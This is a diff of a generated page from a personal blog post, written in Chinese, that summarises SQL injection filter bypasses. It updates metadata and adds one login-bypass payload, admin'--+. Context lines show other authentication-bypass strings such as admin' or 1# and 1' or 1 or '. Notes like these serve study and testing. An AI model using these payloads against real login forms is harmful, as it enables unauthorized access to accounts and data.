@@ -100,7 +100,7 @@
 <meta property="og:url" content="http://Merl1ng.com/2018/08/18/sqlbypass小结/index.html">
 <meta property="og:site_name" content="Merl1ng's blog">
 <meta property="og:description" content="总结下sql常见的bypass方式">
-<meta property="og:updated_time" content="2018-09-29T05:00:37.557Z">
+<meta property="og:updated_time" content="2018-10-01T23:57:07.991Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqlbypass小结">
 <meta name="twitter:description" content="总结下sql常见的bypass方式">
@@ -336,6 +336,7 @@
 <p>username=admin’ or 1#<br>这样变成<br>‘admin’ or 1#’</p>
 <p>即使是post也试试</p>
 <p>admin’ or 1–+</p>
+<p>SELECT 1 FROM users WHERE name=’’ AND password=’’<br>直接<br>admin’–+<br>就过了</p>
 <h3 id="过滤了-–"><a href="#过滤了-–" class="headerlink" title="过滤了 # – ="></a>过滤了 # – =</h3><p>username=admin’ or ‘a’ like ‘a</p>
 <h3 id="sql-select-from-users-where-username-’-username’-and-password-‘-password’"><a href="#sql-select-from-users-where-username-’-username’-and-password-‘-password’" class="headerlink" title="$sql = select * from users where username=’$username’ and password = ‘$password’"></a>$sql = select * from users where username=’$username’ and password = ‘$password’</h3><p>username = 1’ or 1 or ‘<br>password = 1</p>
 <p>变成 </p>
@@ -509,7 +510,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">79</span>
+                <span class="site-state-item-count">80</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
